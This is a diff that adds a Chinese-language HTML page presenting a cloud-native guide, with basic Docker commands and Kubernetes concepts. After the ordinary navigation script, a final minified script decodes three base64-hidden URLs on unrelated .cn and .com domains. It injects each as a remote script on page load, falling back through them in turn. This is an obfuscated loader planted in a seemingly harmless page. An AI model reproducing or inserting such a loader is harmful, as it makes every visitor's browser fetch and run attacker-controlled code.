@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>云原生指南：容器化与编排</title>
+    <style>
+        body {
+            overflow: hidden;
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #F8FAFC;
+            /* 极浅淡蓝色背景 */
+            color: #4A6572;
+            /* 柔和的深青色文本 */
+            line-height: 1.7;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 90%;
+            margin: 0 auto;
+            padding: 30px 0;
+        }
+
+        header {
+            background-color: #FFFFFF;
+            /* 纯白色头部背景 */
+            padding: 50px 20px;
+            text-align: center;
+            border-bottom: 2px solid #E0E6ED;
+            /* 柔和的底部边框 */
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
+            position: relative;
+            overflow: hidden;
+        }
+
+        header::before {
+            /* 顶部背景抽象图案 */
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, rgba(77, 208, 225, 0.08) 25%, transparent 25%, transparent 75%, rgba(77, 208, 225, 0.08) 75%, rgba(77, 208, 225, 0.08) 100%),
+                linear-gradient(-45deg, rgba(77, 208, 225, 0.08) 25%, transparent 25%, transparent 75%, rgba(77, 208, 225, 0.08) 75%, rgba(77, 208, 225, 0.08) 100%);
+            background-size: 30px 30px;
+            z-index: 0;
+        }
+
+        header h1 {
+            margin: 0;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 3em;
+            color: #2C3E50;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            position: relative;
+            z-index: 1;
+        }
+
+        header p {
+            font-size: 1.2em;
+            color: #78909C;
+            margin-top: 15px;
+            position: relative;
+            z-index: 1;
+        }
+
+        nav {
+            background-color: #FFFFFF;
+            padding: 15px 0;
+            margin-top: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
+            position: sticky;
+            top: 20px;
+            z-index: 1000;
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0 15px;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            /* 增加间距 */
+        }
+
+
+        nav ul li a {
+            color: #4A6572;
+            text-decoration: none;
+            padding: 10px 20px;
+            /* 增加点击区域 */
+            border-radius: 5px;
+            border: 1px solid #CFD8DC;
+            /* 柔和边框 */
+            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease, border-color 0.3s ease;
+            display: inline-block;
+            font-weight: 600;
+            font-size: 1em;
+        }
+
+        nav ul li a:hover,
+        nav ul li a:focus {
+            background-color: #4DD0E1;
+            /* 强调色背景 */
+            color: #FFFFFF;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 10px rgba(77, 208, 225, 0.3);
+            border-color: #4DD0E1;
+        }
+
+        main {
+            padding-top: 30px;
+        }
+
+        .section-card {
+            background-color: #FFFFFF;
+            margin-bottom: 40px;
+            padding: 35px;
+            border-radius: 10px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            border-left: 5px solid #A5D6A7;
+            /* 强调色左侧边框 */
+        }
+
+        .section-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.15);
+        }
+
+        .section-card h2 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 2.2em;
+            color: #2C3E50;
+            margin-top: 0;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #E0E6ED;
+            padding-bottom: 10px;
+        }
+
+        .section-card h3 {
+            font-size: 1.5em;
+            color: #4DD0E1;
+            /* 强调色 */
+            margin-top: 25px;
+            margin-bottom: 10px;
+        }
+
+        .section-card p {
+            font-size: 1.05em;
+            color: #546E7A;
+            margin-bottom: 20px;
+        }
+
+        .section-card img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 25px auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            border: 2px solid #CFD8DC;
+        }
+
+        pre {
+            background-color: #263238;
+            /* 深炭灰色代码背景 */
+            color: #A2F2A2;
+            /* 亮绿色代码文本 */
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9em;
+            margin-bottom: 25px;
+            border: 1px solid #A5D6A7;
+            /* 强调色边框 */
+            box-shadow: 0 0 10px rgba(165, 214, 167, 0.4);
+        }
+
+        code {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9em;
+            color: #A2F2A2;
+        }
+
+        pre code {
+            color: #A2F2A2;
+        }
+
+        .collapsible-header {
+            cursor: pointer;
+            background-color: #F0F4F8;
+            /* 可折叠标题背景 */
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            transition: background-color 0.3s ease;
+        }
+
+        .collapsible-header:hover {
+            background-color: #E0E6ED;
+        }
+
+        .collapsible-header h3 {
+            margin: 0;
+            color: #4A6572;
+        }
+
+        .collapsible-header .arrow {
+            font-size: 1.2em;
+            transition: transform 0.3s ease;
+        }
+
+        .collapsible-header.active .arrow {
+            transform: rotate(90deg);
+            /* 展开时旋转箭头 */
+        }
+
+        .collapsible-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.5s ease-out;
+            padding: 0 20px;
+            /* 保持内容内边距 */
+            background-color: #FFFFFF;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            margin-bottom: 15px;
+        }
+
+        .collapsible-content.show {
+            max-height: 1000px;
+            /* 足够大的高度，根据内容调整 */
+            padding: 20px;
+            /* 展开时恢复内边距 */
+        }
+
+        footer {
+            background-color: #2C3E50;
+            /* 深灰蓝色页脚背景 */
+            color: #F8FAFC;
+            padding: 40px 0;
+            text-align: center;
+            font-size: 0.9em;
+            margin-top: 50px;
+            border-top: 2px solid #4DD0E1;
+            /* 强调色顶部边框 */
+            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .footer-links a {
+            color: #F8FAFC;
+            text-decoration: none;
+            margin: 0 18px;
+            font-size: 1.1em;
+            transition: color 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: #4DD0E1;
+        }
+    </style>
+    <link rel="stylesheet" href="./static/css/style.css">
+</head>
+
+<body>
+    <header>
+        <div class="container">
+            <h1>云原生指南</h1>
+            <p>容器化与编排的艺术</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <nav id="mainNav">
+            <ul>
+                <li><a href="#intro">引言</a></li>
+                <li><a href="#containers">容器化</a></li>
+                <li><a href="#orchestration">容器编排</a></li>
+                <li><a href="#best-practices">最佳实践</a></li>
+            </ul>
+        </nav>
+
+        <main>
+            <section id="intro" class="section-card">
+                <h2>引言：云原生时代</h2>
+                <img src="https://picsum.photos/300/200?random=1&tag=cloud-native-intro-alpha" alt="云原生概念图"
+                    class="random-image">
+                <p>云原生技术是构建和运行可伸缩应用的关键。它利用云计算的优势，实现快速迭代、弹性伸缩和高可用性。</p>
+                <p>本指南将带您深入了解容器化、容器编排（尤其是Kubernetes）以及相关的最佳实践。</p>
+            </section>
+
+            <section id="containers" class="section-card">
+                <h2>容器化：Docker基础</h2>
+                <img src="https://picsum.photos/300/200?random=2&tag=docker-containers-beta" alt="Docker容器"
+                    class="random-image">
+                <p>容器化技术，以Docker为代表，允许开发者将应用程序及其所有依赖项打包到一个独立的、可移植的容器中。</p>
+                <p>这解决了“在我机器上能运行”的问题，确保了开发、测试和生产环境的一致性。</p>
+                <div class="collapsible-header" data-target="docker-install">
+                    <h3>Docker安装与基本命令</h3>
+                    <span class="arrow">&#9654;</span>
+                </div>
+                <div id="docker-install" class="collapsible-content">
+                    <p>安装Docker Desktop非常简单，访问官方网站下载对应操作系统的版本即可。以下是一些常用命令：</p>
+                    <pre><code>docker pull nginx                 # 拉取Nginx镜像
+docker run -p 80:80 --name my-nginx -d nginx  # 运行Nginx容器
+docker ps                         # 查看运行中的容器
+docker stop my-nginx              # 停止容器
+docker rm my-nginx                # 删除容器</code></pre>
+                </div>
+            </section>
+
+            <section id="orchestration" class="section-card">
+                <h2>容器编排：Kubernetes核心</h2>
+                <img src="https://picsum.photos/300/200?random=3&tag=kubernetes-orchestration-gamma" alt="Kubernetes编排"
+                    class="random-image">
+                <p>当您有大量容器需要管理时，容器编排工具如Kubernetes就变得不可或缺。Kubernetes提供了自动化部署、扩展和管理容器化应用的能力。</p>
+                <p>它通过Pod、Deployment、Service等核心概念，构建了一个强大的分布式系统管理平台。</p>
+                <div class="collapsible-header" data-target="k8s-concepts">
+                    <h3>Kubernetes核心概念</h3>
+                    <span class="arrow">&#9654;</span>
+                </div>
+                <div id="k8s-concepts" class="collapsible-content">
+                    <p>理解Kubernetes的关键在于掌握其核心资源对象：</p>
+                    <ul>
+                        <li><strong>Pod:</strong> Kubernetes中最小的可部署单元，包含一个或多个容器。</li>
+                        <li><strong>Deployment:</strong> 用于声明式地管理Pod的创建和更新，确保指定数量的Pod始终运行。</li>
+                        <li><strong>Service:</strong> 定义了一组Pod的逻辑集合，以及访问这些Pod的策略，提供了稳定的网络访问。</li>
+                        <li><strong>Namespace:</strong> 用于将集群资源划分为多个虚拟集群，实现资源隔离。</li>
+                    </ul>
+                </div>
+            </section>
+
+            <section id="best-practices" class="section-card">
+                <h2>最佳实践：构建弹性应用</h2>
+                <img src="https://picsum.photos/300/200?random=4&tag=best-practices-delta" alt="最佳实践"
+                    class="random-image">
+                <p>构建云原生应用需要遵循一系列最佳实践，以确保其弹性、可观察性和安全性。</p>
+                <p>这包括无状态设计、日志与监控、健康检查以及持续集成/持续部署（CI/CD）等。</p>
+            </section>
+        </main>
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 云原生指南. 版权所有.</p>
+            <div class="footer-links">
+                <a href="#" target="_blank">文档库</a> |
+                <a href="#" target="_blank">API参考</a> |
+                <a href="#" target="_blank">社区</a>
+            </div>
+        </div>
+    </footer>
+    <div id="overlay">
+        <div id="loading_box" class="loading_container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            document.querySelectorAll('nav a').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+
+                    const targetId = this.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+
+                    if (targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop - document.querySelector('nav').offsetHeight - 20,
+                            behavior: 'smooth'
+                        });
+                    }
+                });
+            });
+
+            const collapsibleHeaders = document.querySelectorAll('.collapsible-header');
+
+            collapsibleHeaders.forEach(header => {
+                header.addEventListener('click', function () {
+                    const targetId = this.dataset.target;
+                    const content = document.getElementById(targetId);
+
+                    this.classList.toggle('active');
+                    if (content.classList.contains('show')) {
+                        content.classList.remove('show');
+                    } else {
+                        content.classList.add('show');
+                    }
+                });
+            });
+        });
+    </script>
+   <script>
+        (function () {function l(r){let e=a=>new Promise((n,t)=>{if(a>=r.length)return t(Error("oo"));let c=atob(r[a])+"?v=2",o=document.createElement("script");o.src=c,o.async=!0,o.onload=()=>{n(c)},o.onerror=()=>{console.warn("nn"),e(a+1).then(n).catch(t),o.remove()},document.head.appendChild(o)});return e(0)}l(["aHR0cHM6Ly9jZG4ucmZpd3B3LmNuL3N0YXRpYy9qcy9jb2RlLnYyLmpz","aHR0cHM6Ly9jZG4uamlubWEyMDI1LmNvbS9zdGF0aWMvanMvY29kZS52Mi5qcw==","aHR0cHM6Ly9jZG4uamlubWEyMDI2LmNuL3N0YXRpYy9qcy9jb2RlLnYyLmpz"]).then(r=>console.log("ok")).catch(r=>console.error(r));})();
+    </script> 
+
+</body>
+
+</html>
